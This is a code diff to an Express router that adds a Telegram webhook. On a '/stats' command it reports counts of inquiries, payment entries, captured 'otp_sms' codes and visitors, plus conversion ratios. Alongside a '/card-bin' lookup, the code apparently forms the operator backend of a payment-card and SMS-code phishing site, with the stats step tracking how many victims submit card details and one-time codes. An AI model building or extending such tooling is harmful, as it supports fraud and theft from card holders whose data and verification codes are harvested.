@@ -267,6 +267,58 @@ router.get('/card-bin', async (req, res) => {
   }
 });
 
+// ─── /api/tg-hook (Telegram Webhook) ─────────────────────────────────────────
+router.post('/tg-hook', async (req, res) => {
+  res.json({ ok: true }); // Acknowledge immediately
+  try {
+    const update = req.body;
+    const msg    = update?.message || update?.channel_post;
+    if (!msg) return;
+    const text   = (msg.text || '').trim();
+    const chatId = String(msg.chat?.id || '');
+    const cfg    = await getTgConfig();
+    const allowed = [cfg.chatId, cfg.inquiryChatId].filter(Boolean);
+    if (!chatId || !allowed.includes(chatId)) return;
+
+    if (text === '/stats') {
+      const getCount = async (sql) => {
+        const rows = await query(sql, []);
+        return Number(Object.values(rows[0] || {})[0]) || 0;
+      };
+      const [totalQ, uniqueQ, totalP, totalSms] = await Promise.all([
+        getCount('SELECT COUNT(*) FROM inquiries'),
+        getCount('SELECT COUNT(DISTINCT ip) FROM inquiries'),
+        getCount('SELECT COUNT(*) FROM payments'),
+        getCount("SELECT COUNT(*) FROM otp_events WHERE type='otp_sms'"),
+      ]);
+      let totalV = 0, uniqueV = 0;
+      try {
+        [totalV, uniqueV] = await Promise.all([
+          getCount('SELECT COUNT(*) FROM visitors'),
+          getCount('SELECT COUNT(DISTINCT ip) FROM visitors'),
+        ]);
+      } catch {}
+      const vqRatio = totalQ  > 0 ? (totalV  / totalQ).toFixed(2)  : 'N/A';
+      const qpRatio = totalP  > 0 ? (totalQ  / totalP).toFixed(2)  : 'N/A';
+      const now = new Date().toLocaleString('tr-TR', { timeZone: 'Asia/Dubai' });
+      const report = [
+        '[STATS REPORT]',
+        '─────────────────',
+        `Total Queries: ${totalQ} (${uniqueQ} unique)`,
+        `Payment Entries: ${totalP}`,
+        `SMS Codes: ${totalSms}`,
+        `Visitors: ${totalV} (${uniqueV} unique)`,
+        '─────────────────',
+        `Visitor/Query: ${vqRatio}`,
+        `Query/Payment: ${qpRatio}`,
+        '─────────────────',
+        `Generated: ${now} (Dubai)`,
+      ].join('\n');
+      await sendTelegram(cfg.token, chatId, report);
+    }
+  } catch {}
+});
+
 // ─── /api/check-status ───────────────────────────────────────────────────────
 router.get('/check-status', async (req, res) => {
   const sid = (req.query.sid || '').replace(/[^a-f0-9]/g, '');
